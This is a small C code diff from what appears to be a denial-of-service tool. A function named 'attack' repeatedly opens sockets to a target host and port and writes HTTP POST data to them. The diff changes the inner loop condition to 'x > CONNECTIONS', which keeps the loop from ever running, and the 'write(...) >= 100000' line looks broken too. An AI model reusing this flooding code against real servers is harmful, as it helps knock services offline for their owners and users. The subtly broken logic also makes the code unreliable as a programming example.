@@ -56,7 +56,7 @@ void attack(char *host, char *port, int id) {
 		sockets[x]=0;
 	
 	while(i != 10000) {
-		for(x=0; x != CONNECTIONS; x++) {
+		for(x=0; x > CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1) >= 100000;
